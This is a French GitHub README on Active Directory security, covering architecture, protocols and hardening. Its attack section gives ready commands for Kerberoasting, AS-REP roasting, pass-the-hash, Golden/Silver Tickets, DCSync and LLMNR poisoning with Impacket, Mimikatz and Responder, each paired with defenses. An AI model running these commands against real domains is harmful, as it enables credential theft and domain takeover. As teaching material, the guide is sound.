# 🏰 Active Directory — Guide Complet

> **Un guide de référence en cybersécurité sur Active Directory : architecture, protocoles, attaques et durcissement.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Domain: Cybersecurity](https://img.shields.io/badge/Domain-Cybersecurity-red)](https://github.com)
[![Language: French](https://img.shields.io/badge/Language-French-blue)](https://github.com)
[![Status: Active](https://img.shields.io/badge/Status-Active-green)](https://github.com)

---

## 📚 Table des matières

1. [Introduction](#-introduction)
2. [Domain Controller (DC)](#-domain-controller-dc)
3. [LDAP](#-ldap)
4. [Kerberos](#-kerberos)
5. [GPO — Group Policy Objects](#-gpo--group-policy-objects)
6. [OU — Organizational Units](#-ou--organizational-units)
7. [Comptes de service](#-comptes-de-service)
8. [NTLM](#-ntlm)
9. [Attaques courantes](#-attaques-courantes)
10. [Sécurisation](#-sécurisation)
11. [Ressources](#-ressources)

---

## 🎯 Introduction

**Active Directory (AD)** est un service d'annuaire développé par Microsoft, introduit avec Windows Server 2000. Il est aujourd'hui le **système de gestion d'identité et d'accès (IAM)** le plus répandu en entreprise.

Active Directory permet de :
- **Centraliser** l'authentification et l'autorisation des utilisateurs
- **Gérer** les ressources réseau (ordinateurs, imprimantes, partages...)
- **Appliquer** des stratégies de sécurité à l'échelle du parc
- **Organiser** la structure logique d'une organisation

> ⚠️ **Pourquoi c'est critique en cybersécurité ?**
> Compromettre un Active Directory, c'est compromettre l'ensemble du Système d'Information. C'est pourquoi AD est la cible numéro 1 des attaquants dans les environnements Windows.

### Architecture globale

```
Forest (Forêt)
└── Domain (Domaine) : entreprise.local
    ├── Domain Controller (DC)
    ├── Organizational Units (OU)
    │   ├── OU=Users
    │   ├── OU=Computers
    │   └── OU=Groups
    └── Group Policy Objects (GPO)
```

---

## 🖥️ Domain Controller (DC)

### Définition

Le **Domain Controller** est le serveur qui héberge et gère Active Directory. C'est le **cerveau du domaine** : il répond à toutes les demandes d'authentification et centralise la base de données des objets.

### Rôles principaux

| Rôle | Description |
|------|-------------|
| **Authentification** | Valide les identités via Kerberos ou NTLM |
| **Autorisation** | Gère les droits d'accès aux ressources |
| **Réplication** | Synchronise les données entre DCs |
| **DNS** | Résolution de noms dans le domaine |
| **Catalogue Global** | Index de tous les objets de la forêt |

### FSMO — Flexible Single Master Operations

Active Directory définit **5 rôles FSMO**, répartis entre les DCs :

```
Rôles de forêt (unique dans toute la forêt)
├── Schema Master       → Gère les modifications du schéma AD
└── Domain Naming Master → Gère l'ajout/suppression de domaines

Rôles de domaine (unique par domaine)
├── PDC Emulator        → Synchronisation des mots de passe, NTP
├── RID Master          → Attribue les blocs de RID aux DCs
└── Infrastructure Master → Gère les références inter-domaines
```

### La base de données NTDS.dit

Tous les objets AD sont stockés dans le fichier **`%SystemRoot%\NTDS\NTDS.dit`**.

Ce fichier contient :
- Les **hachages des mots de passe** de tous les utilisateurs
- Les **objets** (utilisateurs, groupes, ordinateurs...)
- Les **attributs** de chaque objet

> 🔴 **Risque critique** : L'extraction de ce fichier permet d'obtenir tous les hachages du domaine → attaque de type *DCSync* ou vol physique.

### Bonnes pratiques DC

- ✅ Toujours avoir **minimum 2 DCs** par domaine (haute disponibilité)
- ✅ Placer les DCs sur des **VLANs dédiés** et restreints
- ✅ Surveiller les **événements 4768, 4769, 4771** (Kerberos)
- ✅ Limiter l'accès physique et réseau aux DCs

---

## 📖 LDAP

### Définition

**LDAP (Lightweight Directory Access Protocol)** est le protocole standard utilisé pour **interroger et modifier** un annuaire d'Active Directory. Il fonctionne en clair sur le **port 389** et en chiffré (LDAPS) sur le **port 636**.

### Structure d'un DN (Distinguished Name)

Chaque objet AD est identifié par un chemin unique appelé **DN** :

```
CN=John Doe,OU=Users,OU=Paris,DC=entreprise,DC=local
│            │         │       │
│            │         │       └─ Domain Component
│            │         └───────── Organizational Unit
│            └─────────────────── Organizational Unit
└──────────────────────────────── Common Name
```

### Opérations LDAP courantes

```
BIND    → Authentification auprès de l'annuaire
SEARCH  → Recherche d'objets (la plus utilisée)
ADD     → Création d'un objet
MODIFY  → Modification d'attributs
DELETE  → Suppression d'un objet
COMPARE → Comparaison de valeur d'attribut
```

### Filtres de recherche LDAP

```ldap
# Tous les utilisateurs actifs
(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# Tous les membres d'un groupe
(memberOf=CN=Domain Admins,CN=Users,DC=entreprise,DC=local)

# Comptes avec SPN défini (cible de Kerberoasting)
(&(objectClass=user)(servicePrincipalName=*))

# Utilisateurs avec délégation sans contrainte
(userAccountControl:1.2.840.113556.1.4.803:=524288)
```

### Enumération LDAP (phase de reconnaissance)

```bash
# Avec ldapsearch (Linux)
ldapsearch -x -H ldap://DC_IP -b "DC=entreprise,DC=local" -D "user@entreprise.local" -W

# Avec windapsearch (Python)
python3 windapsearch.py --dc-ip DC_IP -u user@entreprise.local -p Password --da

# Avec crackmapexec
crackmapexec ldap DC_IP -u user -p Password --users
```

> ⚠️ **LDAP vs LDAPS** : En environnement de production, LDAP en clair (port 389) doit être **désactivé**. Tout le trafic doit transiter via **LDAPS (TLS)** sur le port 636.

---

## 🎟️ Kerberos

### Définition

**Kerberos** est le protocole d'authentification principal d'Active Directory depuis Windows 2000. Il repose sur un système de **tickets** pour éviter de transmettre les mots de passe sur le réseau.

### Les acteurs

```
Client (utilisateur)
    ↕
KDC — Key Distribution Center (hébergé sur le DC)
    ├── AS  — Authentication Service
    └── TGS — Ticket Granting Service
    ↕
Serveur de service (ressource cible)
```

### Flux d'authentification Kerberos

```
┌─────────────────────────────────────────────────────────────┐
│                    Flux Kerberos complet                    │
├────────┬───────────────────────────────────────────────────┤
│ Étape  │ Description                                        │
├────────┼───────────────────────────────────────────────────┤
│   1    │ Client → AS : AS-REQ (pré-auth avec hash NT)      │
│   2    │ AS → Client : AS-REP (TGT chiffré avec krbtgt)   │
│   3    │ Client → TGS : TGS-REQ (TGT + SPN demandé)       │
│   4    │ TGS → Client : TGS-REP (ticket de service)        │
│   5    │ Client → Service : AP-REQ (ticket de service)     │
│   6    │ Service → Client : AP-REP (accès accordé)         │
└────────┴───────────────────────────────────────────────────┘
```

### Concepts clés

| Terme | Description |
|-------|-------------|
| **TGT** | Ticket Granting Ticket — preuve d'identité, valide 10h par défaut |
| **ST** | Service Ticket — accès à une ressource spécifique |
| **krbtgt** | Compte spécial dont le hash sert à chiffrer tous les TGTs |
| **SPN** | Service Principal Name — identifiant d'un service sur le réseau |
| **PAC** | Privilege Attribute Certificate — données d'autorisation dans le ticket |

### Délégation Kerberos

La délégation permet à un service d'agir **au nom d'un utilisateur** :

```
Sans contrainte (Unconstrained Delegation)
└── Le service peut s'authentifier partout → DANGEREUX

Avec contrainte (Constrained Delegation)
└── Le service peut s'authentifier vers des cibles définies

Basée sur les ressources (RBCD)
└── C'est la ressource cible qui définit qui peut déléguer vers elle
```

---

## 📋 GPO — Group Policy Objects

### Définition

Les **GPO (Group Policy Objects)** sont des ensembles de paramètres de configuration appliqués automatiquement aux **utilisateurs** et **ordinateurs** du domaine. Elles permettent de gérer la sécurité et la configuration à grande échelle.

### Ordre d'application (LSDOU)

```
1. Local        → Stratégie locale de la machine
2. Site         → Stratégie appliquée au site AD
3. Domain       → Stratégie du domaine
4. OU           → Stratégie de l'OU (la plus prioritaire)
```

> La dernière GPO appliquée **prend le dessus** en cas de conflit (sauf si `Enforced` est activé).

### Structure d'une GPO

```
GPO
├── Configuration Ordinateur
│   ├── Paramètres Windows (Sécurité, Scripts...)
│   ├── Modèles d'administration (Registre)
│   └── Paramètres du Panneau de configuration
└── Configuration Utilisateur
    ├── Paramètres Windows (Scripts, Dossiers...)
    ├── Modèles d'administration
    └── Paramètres des applications
```

### GPOs de sécurité essentielles

```ini
# Politique de mots de passe
Longueur minimale           = 12 caractères
Complexité                  = Activée
Historique                  = 24 mots de passe mémorisés
Durée de vie maximale       = 90 jours

# Verrouillage de compte
Seuil de verrouillage       = 5 tentatives
Durée de verrouillage       = 30 minutes
Réinitialisation du compteur = 30 minutes

# Audit
Connexions                  = Succès + Échec
Modifications d'objets AD   = Succès + Échec
Utilisation des privilèges  = Succès + Échec
```

### Commandes utiles

```powershell
# Lister toutes les GPO du domaine
Get-GPO -All

# Forcer l'application des GPO
gpupdate /force

# Générer un rapport HTML d'une GPO
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path C:\rapport.html

# Voir les GPO appliquées à une machine
gpresult /R /Scope Computer
```

---

## 🗂️ OU — Organizational Units

### Définition

Les **OU (Organizational Units)** sont des conteneurs logiques dans Active Directory permettant d'**organiser les objets** (utilisateurs, groupes, ordinateurs) et d'y **déléguer l'administration** ou d'y **appliquer des GPO**.

### Différence OU vs Groupe

| Critère | OU | Groupe |
|---------|----|--------|
| But principal | Organisation & délégation | Attribution de droits/accès |
| Peut contenir | Objets AD (users, PCs...) | Utilisateurs et groupes |
| GPO applicable | ✅ Oui | ❌ Non |
| Délégation admin | ✅ Oui | ❌ Non |

### Structure recommandée

```
DC=entreprise,DC=local
├── OU=_ADMIN           → Comptes administrateurs
│   ├── OU=Tier0        → Admins du domaine (très sensibles)
│   ├── OU=Tier1        → Admins de serveurs
│   └── OU=Tier2        → Admins de postes de travail
├── OU=Utilisateurs
│   ├── OU=Paris
│   ├── OU=Lyon
│   └── OU=Remote
├── OU=Ordinateurs
│   ├── OU=Serveurs
│   └── OU=Postes
├── OU=Groupes
└── OU=Comptes_Service
```

### Modèle de délégation (Tiering)

Le modèle **Microsoft Tier** limite la propagation des compromissions :

```
Tier 0 → Domain Controllers, comptes krbtgt, admins AD
   ↕ jamais de connexion croisée
Tier 1 → Serveurs d'applications, comptes de service
   ↕ jamais de connexion croisée
Tier 2 → Postes de travail, utilisateurs standards
```

---

## 👤 Comptes de service

### Définition

Les **comptes de service** sont des comptes AD utilisés par des **applications et services** (SQL Server, IIS, tâches planifiées...) pour s'authentifier et accéder à des ressources.

### Types de comptes de service

#### 1. Compte utilisateur classique (déprécié)

```powershell
New-ADUser -Name "svc_sql" -AccountPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force) -Enabled $true
```

❌ Problèmes : mot de passe statique, géré manuellement, risque de Kerberoasting.

#### 2. Managed Service Account (MSA)

```powershell
# Créer un MSA (lié à une seule machine)
New-ADServiceAccount -Name "msa_sql" -RestrictToSingleComputer
Install-ADServiceAccount -Identity "msa_sql"
```

✅ Le mot de passe est **géré automatiquement** par AD (rotation toutes les 30 jours).
❌ Limité à **un seul serveur**.

#### 3. Group Managed Service Account (gMSA) ← Recommandé

```powershell
# Créer la clé racine KDS (une seule fois par forêt)
Add-KdsRootKey -EffectiveImmediately

# Créer le gMSA
New-ADServiceAccount -Name "gmsa_sql" `
    -DNSHostName "gmsa_sql.entreprise.local" `
    -PrincipalsAllowedToRetrieveManagedPassword "SG_Serveurs_SQL"

# Installer sur le serveur
Install-ADServiceAccount -Identity "gmsa_sql"
```

✅ Rotation automatique du mot de passe  
✅ Utilisable sur **plusieurs serveurs**  
✅ Aucun humain ne connaît le mot de passe

### SPN et Kerberoasting

Chaque compte de service ayant un **SPN** enregistré est une cible potentielle de **Kerberoasting** :

```powershell
# Voir les comptes avec SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Enregistrer un SPN
setspn -A MSSQLSvc/serveur.entreprise.local:1433 svc_sql
```

---

## 🔐 NTLM

### Définition

**NTLM (NT LAN Manager)** est l'ancien protocole d'authentification de Microsoft, **antérieur à Kerberos**. Il est encore présent dans les environnements modernes pour des raisons de compatibilité.

### Flux d'authentification NTLM (Challenge/Response)

```
Client                          Serveur
  │                               │
  │──── 1. NEGOTIATE_MESSAGE ────→│
  │                               │
  │←─── 2. CHALLENGE_MESSAGE ────│  (nonce 8 octets aléatoires)
  │                               │
  │──── 3. AUTHENTICATE_MESSAGE ─→│  (Hash NT + challenge)
  │                               │
  │          [Vérification via DC si nécessaire]
```

### Hachage NTLM

Le hash NTLM est calculé ainsi :

```
Hash NT = MD4(UTF-16LE(mot_de_passe))
```

> ⚠️ Pas de sel (salt) → vulnérable aux attaques par dictionnaire et rainbow tables.

### NTLMv1 vs NTLMv2

| Critère | NTLMv1 | NTLMv2 |
|---------|--------|--------|
| Sécurité | Très faible | Moyenne |
| Crack possible | Facilement | Difficile mais possible |
| Recommandation | ❌ Désactiver | ⚠️ Toléré, désactiver si possible |

### Désactiver NTLM via GPO

```
Configuration Ordinateur
└── Paramètres Windows
    └── Paramètres de sécurité
        └── Stratégies locales
            └── Options de sécurité
                └── Sécurité réseau : Niveau d'authentification LAN Manager
                    → "Envoyer uniquement les réponses NTLMv2. Refuser LM et NTLM"
```

---

## ⚔️ Attaques courantes

> ⚠️ **Avertissement légal** : Ces informations sont présentées à des fins éducatives uniquement. Toute utilisation sur des systèmes sans autorisation explicite est illégale. Ces techniques servent à comprendre les menaces pour mieux s'en défendre.

---

### 1. 🎣 AS-REP Roasting

**Principe** : Si la pré-authentification Kerberos est désactivée sur un compte, n'importe qui peut demander un AS-REP et tenter de cracker le hash hors ligne.

```bash
# Identification des comptes vulnérables
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Exploitation avec Impacket
GetNPUsers.py entreprise.local/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Crack du hash
hashcat -m 18200 hash.txt wordlist.txt
```

**Défense** :
- ✅ Activer la pré-authentification sur tous les comptes
- ✅ Auditer l'attribut `DoesNotRequirePreAuth`

---

### 2. 🎟️ Kerberoasting

**Principe** : Tout utilisateur authentifié peut demander un ticket de service pour n'importe quel SPN. Ce ticket est chiffré avec le hash du compte de service → crackable hors ligne.

```bash
# Lister les comptes avec SPN
GetUserSPNs.py entreprise.local/user:password -dc-ip DC_IP

# Obtenir les tickets
GetUserSPNs.py entreprise.local/user:password -dc-ip DC_IP -request

# Crack
hashcat -m 13100 tickets.txt wordlist.txt
```

**Défense** :
- ✅ Utiliser des **gMSA** (mots de passe complexes de 120 caractères)
- ✅ Auditer régulièrement les comptes avec SPN
- ✅ Détecter les demandes TGS anormales (event 4769)

---

### 3. 🔄 Pass-the-Hash (PtH)

**Principe** : Réutiliser un hash NTLM volé pour s'authentifier **sans connaître le mot de passe en clair**.

```bash
# Avec CrackMapExec
crackmapexec smb CIBLE_IP -u Administrator -H HASH_NT

# Avec Impacket
psexec.py -hashes :HASH_NT Administrator@CIBLE_IP

# Avec Mimikatz
sekurlsa::pth /user:Administrator /domain:entreprise.local /ntlm:HASH_NT /run:cmd.exe
```

**Défense** :
- ✅ Activer **Protected Users** group
- ✅ Déployer **Credential Guard**
- ✅ Désactiver NTLM là où c'est possible

---

### 4. 🎫 Pass-the-Ticket (PtT)

**Principe** : Voler un ticket Kerberos (TGT ou ST) depuis la mémoire et l'injecter dans une session.

```powershell
# Extraire les tickets (Mimikatz)
sekurlsa::tickets /export

# Injecter un ticket
kerberos::ptt ticket.kirbi
```

**Défense** :
- ✅ Activer **Protected Users**
- ✅ Limiter la durée de vie des tickets
- ✅ Monitorer les tickets avec des adresses IP inhabituelles

---

### 5. 👑 Golden Ticket

**Principe** : Avec le hash du compte **krbtgt**, forger des TGTs arbitraires avec n'importe quel nom d'utilisateur et n'importe quel privilège.

```powershell
# Prérequis : hash krbtgt + SID du domaine
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::golden /user:Administrator /domain:entreprise.local /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi
mimikatz # kerberos::ptt golden.kirbi
```

**Défense** :
- ✅ **Double rotation** du mot de passe krbtgt (intervalle de 10h)
- ✅ Surveiller les tickets avec des durées anormales
- ✅ Détecter l'utilisation de comptes inexistants dans les logs

---

### 6. 🥈 Silver Ticket

**Principe** : Forger un ticket de service pour un service spécifique en utilisant le hash du compte associé au SPN (sans toucher au DC).

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:entreprise.local /sid:S-1-5-21-... /target:serveur.entreprise.local /service:cifs /rc4:HASH_COMPTE_SERVICE /ticket:silver.kirbi
```

**Défense** :
- ✅ Activer la **validation PAC** côté services
- ✅ Surveiller les connexions sans pré-authentification Kerberos

---

### 7. 🔄 DCSync

**Principe** : Simuler le comportement d'un DC pour **répliquer les hachages** de tous les utilisateurs, y compris krbtgt et Administrator.

```bash
# Prérequis : droits "Replicating Directory Changes"
secretsdump.py -just-dc entreprise.local/Admin:Password@DC_IP

# Avec Mimikatz
lsadump::dcsync /domain:entreprise.local /all /csv
```

**Défense** :
- ✅ Auditer qui possède les droits **DS-Replication-Get-Changes**
- ✅ Alerter sur l'event **4662** avec des GUID de réplication
- ✅ Restreindre ces droits aux seuls DCs

---

### 8. 📝 ACL Abuse

**Principe** : Exploiter des permissions mal configurées sur des objets AD pour escalader les privilèges.

```
Permissions dangereuses à surveiller :
├── GenericAll       → Contrôle total sur l'objet
├── GenericWrite     → Modification des attributs
├── WriteDACL        → Modification des permissions
├── WriteOwner       → Changement de propriétaire
├── AllExtendedRights → ResetPassword, etc.
└── ForceChangePassword → Réinitialisation sans connaître l'ancien MDP
```

```powershell
# Analyser les ACLs avec BloodHound
# Importer les données SharpHound
Invoke-BloodHound -CollectionMethod All
```

**Défense** :
- ✅ Auditer régulièrement les ACLs avec **BloodHound** (côté défensif)
- ✅ Supprimer les droits hérités inutiles
- ✅ Appliquer le principe du **moindre privilège**

---

### 9. 📢 LLMNR/NBT-NS Poisoning

**Principe** : Répondre frauduleusement aux requêtes de résolution de noms locaux pour capturer des hachages NTLMv2.

```bash
# Capture avec Responder
responder -I eth0 -wrf

# Crack des hachages capturés
hashcat -m 5600 hashes.txt wordlist.txt
```

**Défense** :
- ✅ **Désactiver LLMNR** via GPO : `Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution`
- ✅ Désactiver **NBT-NS** sur toutes les interfaces
- ✅ Mettre en œuvre **SMB Signing**

---

## 🛡️ Sécurisation

### Durcissement du Domain Controller

```powershell
# Activer l'audit avancé
AuditPol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
AuditPol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
AuditPol /set /subcategory:"Logon" /success:enable /failure:enable

# Désactiver les protocoles obsolètes
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5

# Activer SMB Signing
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" -Name "RequireSecuritySignature" -Value 1
```

### Événements Windows à surveiller

| Event ID | Description | Criticité |
|----------|-------------|-----------|
| **4625** | Échec de connexion | 🟡 Moyenne |
| **4648** | Connexion avec credentials explicites | 🟠 Haute |
| **4662** | Opération sur objet AD (DCSync!) | 🔴 Critique |
| **4720** | Création de compte utilisateur | 🟡 Moyenne |
| **4728** | Ajout dans groupe sensible | 🔴 Critique |
| **4768** | Demande TGT Kerberos | 🟡 Moyenne |
| **4769** | Demande ticket de service | 🟡 Moyenne |
| **4771** | Échec pré-auth Kerberos | 🟡 Moyenne |
| **4776** | Tentative d'auth NTLM | 🟡 Moyenne |

### Checklist de sécurisation AD

#### Infrastructure
- [ ] Au moins **2 DCs** par domaine, sur des VLANs dédiés
- [ ] **Sauvegardes** régulières et testées des DCs
- [ ] **LAPS** déployé pour les comptes administrateurs locaux
- [ ] **Mises à jour** appliquées rapidement sur les DCs

#### Authentification
- [ ] **Kerberos** activé, NTLM restreint au maximum
- [ ] **Pré-authentification Kerberos** activée sur tous les comptes
- [ ] **Protected Users** group pour les comptes sensibles
- [ ] **Credential Guard** activé sur les postes admin

#### Comptes et privilèges
- [ ] Modèle **Tier 0/1/2** implémenté
- [ ] **Comptes admin dédiés** (pas d'admin avec l'account du quotidien)
- [ ] **gMSA** pour tous les comptes de service
- [ ] Revue régulière des membres de **Domain Admins**
- [ ] Audit des droits **DCSync** (DS-Replication)

#### Réseau
- [ ] **SMB Signing** obligatoire
- [ ] **LLMNR et NBT-NS désactivés**
- [ ] Filtrage réseau strict entre Tiers
- [ ] Journalisation du trafic réseau vers/depuis les DCs

#### Surveillance
- [ ] **SIEM** connecté aux logs des DCs
- [ ] **BloodHound** en mode défensif (audit régulier)
- [ ] Alertes sur les groupes sensibles (Domain Admins, etc.)
- [ ] Détection des **Golden/Silver Tickets**

### Outils de défense recommandés

| Outil | Usage |
|-------|-------|
| **BloodHound** | Cartographie des chemins d'attaque AD |
| **PingCastle** | Audit automatisé de la sécurité AD |
| **Microsoft Defender for Identity** | Détection d'attaques sur AD en temps réel |
| **LAPS** | Gestion des mots de passe admins locaux |
| **ATA/Advanced Threat Analytics** | Détection comportementale |
| **Purple Knight** | Audit de sécurité AD (Semperis) |

---

## 📚 Ressources

### Apprentissage

- 📘 [Microsoft Learn — Active Directory](https://learn.microsoft.com/fr-fr/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)
- 📘 [TryHackMe — Active Directory Basics](https://tryhackme.com/room/winadbasics)
- 📘 [HackTheBox — AD Path](https://app.hackthebox.com/tracks/Active-Directory-101)

### Attaque / Défense

- 🔴 [The Hacker Recipes — AD](https://www.thehacker.recipes/ad/)
- 🔴 [SpecterOps — BloodHound](https://github.com/BloodHoundAD/BloodHound)
- 🔴 [Impacket](https://github.com/fortra/impacket)
- 🛡️ [PingCastle](https://www.pingcastle.com/)
- 🛡️ [Microsoft LAPS](https://learn.microsoft.com/fr-fr/windows-server/identity/laps/laps-overview)

### Références

- 📄 [Microsoft Security Compliance Toolkit](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
- 📄 [ANSSI — Recommandations relatives à Active Directory](https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-a-active-directory/)
- 📄 [CIS Benchmarks — Windows Server](https://www.cisecurity.org/cis-benchmarks)

---

## 🤝 Contribuer

Les contributions sont les bienvenues ! Pour contribuer :

1. **Fork** le projet
2. Créez une branche (`git checkout -b feature/nouvelle-section`)
3. Commitez vos changements (`git commit -m 'Ajout : section sur ADCS'`)
4. Push sur la branche (`git push origin feature/nouvelle-section`)
5. Ouvrez une **Pull Request**

### Idées de contributions

- [ ] Section sur **ADCS (Active Directory Certificate Services)** et les attaques ESC1-ESC8
- [ ] Section sur **Azure AD / Entra ID** et les attaques hybrides
- [ ] Ajout de **labs pratiques** (scripts de déploiement)
- [ ] Traduction en anglais

---

## 📜 Licence

Ce projet est sous licence **MIT**. Vous êtes libre de l'utiliser, le modifier et le distribuer à condition de mentionner l'auteur original.

---

<div align="center">

**⭐ Si ce guide vous a été utile, n'hésitez pas à laisser une étoile !**

*Made with ❤️ for the cybersecurity community*

</div>
